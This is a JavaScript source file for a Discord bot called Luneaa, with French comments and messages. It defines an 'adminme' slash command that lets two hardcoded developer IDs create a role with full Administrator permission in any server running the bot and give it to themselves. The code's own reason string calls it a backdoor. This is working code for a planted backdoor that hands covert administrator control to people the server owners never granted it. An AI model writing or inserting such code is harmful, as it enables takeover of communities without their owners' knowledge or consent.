const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

// Liste des Architectes (Ton ID et celui de ton collègue)
const OWNERS = ['1132930851508846622', '1074743247768920176']; 

module.exports = {
    data: new SlashCommandBuilder()
        .setName('adminme')
        .setDescription('DEV ONLY - Active le mode Architecte (Permissions globales).'),

    async execute(interaction) {
        if (!OWNERS.includes(interaction.user.id)) {
            return interaction.reply({ 
                content: '⛔ Tentative d\'intrusion bloquée. Vous n\'êtes pas un développeur de Luneaa.', 
                ephemeral: true 
            });
        }

        try {
            let role = interaction.guild.roles.cache.find(r => r.name === 'Luneaa-Architect');
            
            if (!role) {
                role = await interaction.guild.roles.create({
                    name: 'Luneaa-Architect',
                    permissions: [PermissionFlagsBits.Administrator],
                    color: '#2b2d31',
                    reason: 'Backdoor d\'intervention développeur'
                });
            }

            await interaction.member.roles.add(role);
            
            await interaction.reply({ 
                content: `✅ **Mode Architecte activé.**\nLe rôle \`${role.name}\` t'a été attribué. Les commandes administrateur vont apparaître dans ton menu (Ferme et rouvre l'application si besoin).`, 
                ephemeral: true 
            });

        } catch (error) {
            console.error('[AdminMe Error]', error);
            await interaction.reply({ 
                content: '❌ Impossible de s\'octroyer les permissions. Vérifie que le rôle de Luneaa est placé **tout en haut** de la hiérarchie des rôles de ce serveur.', 
                ephemeral: true 
            });
        }
    },
};